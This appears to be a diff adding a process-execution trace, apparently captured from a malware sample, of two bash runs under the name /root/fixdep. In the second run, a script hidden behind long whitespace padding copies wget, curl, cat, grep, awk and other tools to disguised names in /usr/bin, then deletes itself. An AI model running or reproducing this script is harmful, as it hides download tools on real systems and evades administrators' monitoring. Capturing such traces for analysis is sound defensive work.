@@ -1,0 +1,49 @@
+PASS=0
+FILE=/bin/bash
+ARGV[0]=<<EOF
+/root/fixdep
+EOF
+ARGV[1]=<<EOF
+-c
+EOF
+ARGV[2]=<<EOF
+exec '/root/fixdep' "$@"
+EOF
+ARGV[3]=<<EOF
+/root/fixdep
+EOF
+PASS=1
+FILE=/bin/bash
+ARGV[0]=<<EOF
+/root/fixdep
+EOF
+ARGV[1]=<<EOF
+-c
+EOF
+ARGV[2]=<<EOF
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                #!/bin/bash
+    cp /usr/bin/wget /usr/bin/wallctl 2>/dev/null
+    cp /usr/bin/curl /usr/bin/viewctl 2>/dev/null
+    if [[ -e /usr/bin/date ]]; then
+    cp /usr/bin/date /usr/bin/zcatctl 2>/dev/null
+    else
+    cp /bin/date /usr/bin/zcatctl 2>/dev/null
+    fi
+    if [[ -e /usr/bin/cat ]]; then
+    cp /usr/bin/cat /usr/bin/watchgnupg1 2>/dev/null
+    else
+    cp /bin/cat /usr/bin/watchgnupg1 2>/dev/null
+    fi
+    if [[ -e /usr/bin/grep ]]; then
+    cp /usr/bin/grep /usr/bin/watchgnupg2 2>/dev/null
+    else
+    cp /bin/grep /usr/bin/watchgnupg2 2>/dev/null
+    fi
+    cp /usr/bin/cut /usr/bin/watchgnupg3 2>/dev/null
+    cp /usr/bin/awk /usr/bin/watchgnupg4 2>/dev/null
+    rm -f fixdep
+
+EOF
+ARGV[3]=<<EOF
+/root/fixdep
+EOF
